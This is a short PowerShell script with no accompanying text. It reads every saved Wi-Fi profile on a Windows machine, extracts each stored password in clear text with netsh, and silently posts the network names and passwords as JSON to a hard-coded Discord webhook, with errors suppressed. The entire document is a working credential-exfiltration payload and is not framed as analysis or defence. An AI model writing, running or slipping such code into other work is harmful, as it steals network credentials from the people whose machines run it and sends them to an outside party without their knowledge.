$a = netsh wlan show profiles | Select-String 'All User Profile';

$r = @();

$a | % {

    $n = $_ -replace '.*:\s+', '';

    $p = netsh wlan show profile name="$n" key=clear |
         Select-String 'Key Content';

    $r += @{
        SSID = $n;
        Password = if ($p) {
            $p -replace '.*:\s+', ''
        }
        else {
            '[OPEN]'
        }
    };

}

$u = 'https://discord.com/api/webhooks/1530827985119088745/q5uT6bwcAFbi6YAn4QvkT6WuQORBA8IjLlE48IRTAMCFusFmBEL1pSKHR47eQbNkpfPL';

$m = @{
    content = "WiFi: $($r | ConvertTo-Json -Compress)"
};

Invoke-RestMethod `
    $u `
    -Method Post `
    -ContentType 'application/json' `
    -Body ($m | ConvertTo-Json) `
    -ErrorAction SilentlyContinue;
